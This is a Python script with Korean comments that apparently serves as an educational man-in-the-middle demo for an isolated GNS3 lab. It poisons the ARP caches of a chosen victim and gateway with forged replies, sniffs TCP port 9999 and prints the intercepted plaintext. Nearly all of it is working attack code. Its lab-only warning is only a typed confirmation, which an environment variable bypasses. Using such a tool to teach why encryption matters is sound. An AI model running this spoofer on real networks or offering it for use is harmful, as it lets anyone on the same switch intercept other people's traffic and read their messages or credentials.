"""
mitm.py  —  3단계 MITM(중간자) 공격 시뮬레이터  [GNS3 격리망 전용]

[목표(교육용)] ARP Spoofing으로 피해자와 게이트웨이 사이에 끼어들어,
       평문 TCP 채팅(포트 9999) 메시지를 '가로채기만 해도' 원문이 읽힌다는 것을
       직접 보여준다. 즉 '왜 암호화가 필요한가'를 실증한다.

[수업 연결]
  - ARP: L3 정보(IP)로 L2 정보(MAC)를 알아내는 프로토콜. 응답을 검증하지 않는다(0930 강의).
  - ARP 요청/응답은 브로드캐스트 영역(같은 L2, 같은 스위치) 안에서만 오간다(1028 강의).
    => 그래서 공격자는 반드시 피해자와 '같은 스위치'에 있어야 한다.
  - 라우터는 네트워크ID만 보고 포워딩하며 IP 헤더는 끝까지 유지된다(1007 강의).
    => 가로챈 패킷에서 IP는 그대로이고 바뀐 건 목적지 MAC뿐이다.

[중요] 이 프로그램은 '남의 네트워크를 공격하는' 도구가 아니라,
       내가 만든 GNS3 격리 실습망 안에서만 쓰는 교육용 시연 도구이다.
       실제/공용 네트워크에서 실행하는 것은 불법이며 금지한다.
"""

import argparse
import os
import sys
import time

# scapy 는 GNS3 노드(리눅스)에서 설치해 실행한다. 로컬 문법검증 시 없을 수 있어
# import 를 main 안에서 try 로 감싼다.


def require_lab_confirmation():
    """격리망에서만 실행하도록 사용자 확인을 강제한다."""
    print("=" * 60)
    print(" [경고] MITM 공격 시뮬레이터 — GNS3 격리망 전용")
    print(" 공용/실제 네트워크에서 실행하면 불법입니다.")
    print("=" * 60)
    # 격리 실습망에서의 자동 실행용: 환경변수로 확인을 대체(대화형 입력이 없을 때)
    if os.environ.get("LAB_CONFIRM") == "1":
        print(" [자동확인] LAB_CONFIRM=1 (격리 실습망 전용으로 실행)")
        return
    answer = input(" 격리된 실습망입니까? 실행하려면 'LAB' 입력: ").strip()
    if answer != "LAB":
        print("[중단] 확인되지 않아 실행을 취소합니다.")
        sys.exit(1)


def run(victim_ip, gateway_ip, iface, tamper):
    from scapy.all import ARP, Ether, srp, send, sniff, Raw, getmacbyip

    def mac_of(ip):
        mac = getmacbyip(ip)
        if mac is None:
            print(f"[오류] {ip} 의 MAC을 찾지 못했습니다. (같은 L2에 있는지 확인)")
            sys.exit(1)
        return mac

    victim_mac = mac_of(victim_ip)
    gateway_mac = mac_of(gateway_ip)
    print(f"[정보] victim {victim_ip}={victim_mac}, gateway {gateway_ip}={gateway_mac}")

    def spoof():
        # op=2(응답)을 위조 전송: "게이트웨이의 주인은 나(공격자)야"라고 피해자에게,
        #                         "피해자의 주인은 나야"라고 게이트웨이에게 거짓말한다.
        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip), verbose=0)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip), verbose=0)

    def restore():
        # 종료 시 올바른 MAC을 알려 ARP 테이블을 원상 복구한다(흔적/장애 최소화).
        for _ in range(5):
            send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                     psrc=gateway_ip, hwsrc=gateway_mac), verbose=0)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                     psrc=victim_ip, hwsrc=victim_mac), verbose=0)
        print("[복원] ARP 테이블을 원래대로 되돌렸습니다.")

    def on_packet(pkt):
        if pkt.haslayer(Raw):
            try:
                payload = pkt[Raw].load.decode("utf-8", errors="replace")
            except Exception:
                return
            src = pkt[0][1].src if pkt.haslayer("IP") else "?"
            print(f"[탈취 {src}] {payload}")
            if tamper:
                # 변조 시연: 실제 재전송 변조는 별도 중계 로직이 필요하므로,
                # 여기서는 '변조 가능함'을 로그로 표시만 한다(교육 범위 제한).
                print("        └─[변조옵션] 이 지점에서 내용 변경·재전송이 가능함")

    print("[실행] ARP Spoofing 시작 (0.5초 간격). Ctrl+C 로 종료.")
    print("[주의] 리눅스에서 'sysctl -w net.ipv4.ip_forward=1' 선적용 필요(중계 유지).")
    try:
        import threading

        def poisoner():
            while True:
                spoof()
                time.sleep(0.5)

        threading.Thread(target=poisoner, daemon=True).start()
        # 포트 9999 트래픽만 실시간 수신해 페이로드를 출력
        sniff(filter="tcp port 9999", iface=iface, prn=on_packet, store=0)
    except KeyboardInterrupt:
        pass
    finally:
        restore()


def main():
    ap = argparse.ArgumentParser(description="MITM 공격 시뮬레이터 (GNS3 격리망 전용)")
    ap.add_argument("--victim", required=True, help="피해자 IP (예: 192.168.1.11)")
    ap.add_argument("--gateway", required=True, help="게이트웨이/서버 IP (예: 192.168.1.10)")
    ap.add_argument("--iface", default=None, help="네트워크 인터페이스 이름")
    ap.add_argument("--tamper", action="store_true", help="변조 가능 지점 표시")
    args = ap.parse_args()

    require_lab_confirmation()
    run(args.victim, args.gateway, args.iface, args.tamper)


if __name__ == "__main__":
    main()
